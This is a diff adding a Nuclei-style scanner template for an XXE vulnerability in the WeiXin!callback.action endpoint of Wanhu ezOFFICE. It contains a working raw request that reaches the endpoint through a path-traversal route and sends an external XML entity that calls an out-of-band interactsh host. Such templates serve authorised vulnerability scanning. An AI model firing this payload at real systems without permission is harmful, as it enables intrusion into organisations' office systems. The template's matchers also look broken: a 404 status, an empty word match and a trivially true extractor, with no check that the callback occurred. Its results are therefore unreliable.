@@ -1,0 +1,34 @@
+id: poc-yaml-whir-ezoffice-weixin-callback-action-xxe
+info:
+  name: "万户 ezOFFICE WeiXin!callback.action XXE漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe,DNSLOG
+  description: |
+    万户OA ezOFFICE XXE vulnerability in WeiXin!callback.action endpoint.
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../WeiXin!callback.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+
+        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://{{reverse}}"> ]>
+        <foo>&xxe;</foo>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 404
+      - type: word
+        part: body
+        words:
+          - ""
+    extractors:
+      - type: dsl
+        dsl:
+          - reverse != ""
